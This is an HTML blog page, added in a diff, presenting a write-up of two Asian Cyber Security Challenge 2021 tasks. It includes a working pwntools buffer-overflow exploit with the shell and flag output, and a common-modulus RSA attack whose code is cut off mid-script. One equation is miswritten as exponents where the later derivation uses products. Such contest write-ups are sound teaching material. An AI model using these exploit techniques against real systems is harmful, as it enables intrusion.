@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="filtered (pwn-100)SummaryWe are given a binary file and its source code. Our mission is to connect to server, exploit it and get the flag. 1234567891011121314151617181920212223242526272829303132333435">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Asian Cyber Security Challenge 2021">
+<meta property="og:url" content="https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/index.html">
+<meta property="og:site_name" content="Wのﾑ刀ﾶ乇の11&#39;丂 乃ﾚのム">
+<meta property="og:description" content="filtered (pwn-100)SummaryWe are given a binary file and its source code. Our mission is to connect to server, exploit it and get the flag. 1234567891011121314151617181920212223242526272829303132333435">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-19T13:00:34.000Z">
+<meta property="article:modified_time" content="2022-05-06T05:21:06.727Z">
+<meta property="article:author" content="Wのﾑ刀ﾶ乇の11">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favion.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Asian Cyber Security Challenge 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/09/27/DownUnderCTF-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&text=Asian Cyber Security Challenge 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&is_video=false&description=Asian Cyber Security Challenge 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Asian Cyber Security Challenge 2021&body=Check out this article: https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&name=Asian Cyber Security Challenge 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&t=Asian Cyber Security Challenge 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#filtered-pwn-100"><span class="toc-number">1.</span> <span class="toc-text">filtered (pwn-100)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RSA-stream-crypto-100"><span class="toc-number">2.</span> <span class="toc-text">RSA stream (crypto-100)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary-1"><span class="toc-number">2.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.2.</span> <span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-our-RSA-back"><span class="toc-number">2.2.1.</span> <span class="toc-text">Getting our RSA back</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-RSA"><span class="toc-number">2.2.2.</span> <span class="toc-text">Cracking RSA</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Asian Cyber Security Challenge 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Wのﾑ刀ﾶ乇の11</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-19T13:00:34.000Z" itemprop="datePublished">2021-09-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="filtered-pwn-100"><a href="#filtered-pwn-100" class="headerlink" title="filtered (pwn-100)"></a>filtered (pwn-100)</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>We are given a binary file and its source code. Our mission is to connect to server, exploit it and get the flag.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call this function! */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Print `msg` */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, msg, <span class="built_in">strlen</span>(msg));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Print `msg` and read `size` bytes into `buf` */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line">  print(msg);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      print(<span class="string">&quot;I/O Error\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      buf[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Print `msg` and read an integer value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readint</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">  readline(msg, buf, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Entry point! */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Read and check length */</span></span><br><span class="line">  length = readint(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (length &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    print(<span class="string">&quot;Buffer overflow detected!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Read data */</span></span><br><span class="line">  readline(<span class="string">&quot;Data: &quot;</span>, buf, length);</span><br><span class="line">  print(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Quickly peeking the source code, it turned out that this is a BOF challenge.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read and check length */</span></span><br><span class="line">length = readint(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (length &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">	print(<span class="string">&quot;Buffer overflow detected!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>It’s a bit tricky here. To bypass this snippet, we need to ensure that <code>length &lt;= 0x100</code>. I try some random value like 1111111111111111 to make it negative (integer overflow).</p>
+<p>Then, fire up our <code>gdb</code> and find the address of <code>win</code> function.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i func</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line"><span class="number">0x0000000000401000</span>  _init</span><br><span class="line"><span class="number">0x0000000000401090</span>  write@plt</span><br><span class="line"><span class="number">0x00000000004010a0</span>  <span class="built_in">strlen</span>@plt</span><br><span class="line"><span class="number">0x00000000004010b0</span>  read@plt</span><br><span class="line"><span class="number">0x00000000004010c0</span>  execve@plt</span><br><span class="line"><span class="number">0x00000000004010d0</span>  atoi@plt</span><br><span class="line"><span class="number">0x00000000004010e0</span>  <span class="built_in">exit</span>@plt</span><br><span class="line"><span class="number">0x00000000004010f0</span>  _start</span><br><span class="line"><span class="number">0x0000000000401120</span>  _dl_relocate_static_pie</span><br><span class="line"><span class="number">0x0000000000401130</span>  deregister_tm_clones</span><br><span class="line"><span class="number">0x0000000000401160</span>  register_tm_clones</span><br><span class="line"><span class="number">0x00000000004011a0</span>  __do_global_dtors_aux</span><br><span class="line"><span class="number">0x00000000004011d0</span>  frame_dummy</span><br><span class="line"><span class="number">0x00000000004011d6</span>  win 	&lt;= our address is right there</span><br><span class="line"><span class="number">0x0000000000401217</span>  print</span><br><span class="line"><span class="number">0x000000000040124a</span>  readline</span><br><span class="line"><span class="number">0x00000000004012e5</span>  readint</span><br><span class="line"><span class="number">0x000000000040131b</span>  main</span><br><span class="line"><span class="number">0x0000000000401390</span>  __libc_csu_init</span><br><span class="line"><span class="number">0x0000000000401400</span>  __libc_csu_fini</span><br><span class="line"><span class="number">0x0000000000401408</span>  _fini</span><br></pre></td></tr></table></figure>
+
+<p>There is no <code>PIE</code> in this challenge so it’s over:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;filtered.chal.acsc.asia&#x27;</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">280</span> + p64(<span class="number">0x4011d6</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to filtered.chal.acsc.asia on port 9001: Done</span><br><span class="line">b&#x27;== proof-of-work: disabled ==\n&#x27;</span><br><span class="line">b&#x27;Size: &#x27;</span><br><span class="line">b&#x27;Data: &#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Bye!</span><br><span class="line">$ ls</span><br><span class="line">filtered</span><br><span class="line">flag-08d995360bfb36072f5b6aedcc801cd7.txt</span><br><span class="line">$ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt</span><br><span class="line">ACSC&#123;GCC_d1dn&#x27;7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="RSA-stream-crypto-100"><a href="#RSA-stream-crypto-100" class="headerlink" title="RSA stream (crypto-100)"></a>RSA stream (crypto-100)</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getStrongPrime, inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"><span class="comment">#m = b&quot;ACSC&#123;&lt;REDACTED&gt;&#125;&quot; # flag!</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;chal.py&quot;</span>,<span class="string">&quot;rb&quot;</span>).read() <span class="comment"># I&#x27;ll encrypt myself!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len:&quot;</span>,<span class="built_in">len</span>(f))</span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# flag length:&quot;</span>,<span class="built_in">len</span>(m))</span><br><span class="line">m = pad(m, <span class="number">255</span>)</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line">stream = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">cipher = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(f),<span class="number">256</span>):</span><br><span class="line">  q = f[a:a+<span class="number">256</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(q) &lt; <span class="number">256</span>:q = pad(q, <span class="number">256</span>)</span><br><span class="line">  q = bytes_to_long(q)</span><br><span class="line">  c = stream ^ q</span><br><span class="line">  cipher += long_to_bytes(c,<span class="number">256</span>)</span><br><span class="line">  e = gmpy2.next_prime(e)</span><br><span class="line">  stream = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;chal.enc&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(cipher)</span><br></pre></td></tr></table></figure>
+
+<p>Flag is encrypted to $stream$ with RSA 2048bit and then XORed gradually with each 256 bytes block of file <code>chal.py</code>. With each block is XORed, $stream$ is recalculated with public exponent $e$ provided by <code>gmpy2.next_prime()</code> function.</p>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Getting-our-RSA-back"><a href="#Getting-our-RSA-back" class="headerlink" title="Getting our RSA back"></a>Getting our RSA back</h3><p>At first, get our $stream$ back by XORing <code>chal.py</code> with <code>chal.enc</code> for each 256 bytes.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chal.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">    cipher = r.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chal.py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">    f = r.read()</span><br><span class="line"></span><br><span class="line">stream = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">256</span>):</span><br><span class="line">    c = bytes_to_long(cipher[i:i + <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    q = f[i:i + <span class="number">256</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(q) &lt; <span class="number">256</span>:</span><br><span class="line">        q = pad(q, <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">    q = bytes_to_long(q)</span><br><span class="line">    </span><br><span class="line">    stream.append(c ^ q)</span><br></pre></td></tr></table></figure>
+
+<p>Focus on <code>gmpy2.next_prime()</code> function, I realize that it’s not a randomize function so I feed $e$ into it and recover two more $e$ which is used in previous XORed stage.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = [<span class="number">65537</span>, <span class="number">65539</span>, <span class="number">65543</span>]</span><br></pre></td></tr></table></figure>
+
+<p>Now we have 3 $stream$ and 3 public exponents $e$, just crack them and capture the flag, ez :&gt;</p>
+<h3 id="Cracking-RSA"><a href="#Cracking-RSA" class="headerlink" title="Cracking RSA"></a>Cracking RSA</h3><p>Here comes the real problem. The public modulus $n$ isn’t change so that we have a common modulus but different public exponent RSA system.</p>
+<p>$$<br>c_1 \equiv m^{e_1} \pmod{n} \\<br>c_2 \equiv m^{e_2} \pmod{n} \\<br>c_3 \equiv m^{e_3} \pmod{n}<br>$$</p>
+<blockquote>
+<p>It can’t be solved by using Chinese Remainder Theorem as usual. Feeling bad? </p>
+</blockquote>
+<p>Okay, here is an idea:</p>
+<p>Because in this case $gcd(e1, e2) = 1$, we can find integers $x$ and $y$ such that:</p>
+<p>$$<br>x^{e_1} + y^{e_2} = 1<br>$$</p>
+<p>By using the Extended Euclidean algorithm we can easily find $x$ and $y$ sastified above equation. After have $x$ and $y$, the plaintext can be recovered by doing some simple math below:</p>
+<p>$$c_1^x * c_2^y \equiv (m ^ {e_1})^x * (m ^ {e_2})^y \pmod{n} \\<br>\equiv m^{e_1 * x} * m^{e_2 * y} \pmod{n} \\<br>\equiv m ^ {e_1*x + e_2*y} \pmod{n} \\<br>\equiv m ^ 1 \pmod{n} \\<br>\equiv m \pmod{n}$$</p>
+<p>We only need two pair $(c_1, c_2)$ and $(e_1, e_2)$, easy huh? However, $x$ or $y$ can be negative so that we have to do some Modular Multiplicative Inverse.</p>
+<p>In this case, I don’t have to worry about it, just let python does all the work:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> (x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chal.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">    cipher = r.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chal.py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">    f = r.read()</span><br><span class="line"></span><br><span class="line">stream = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span 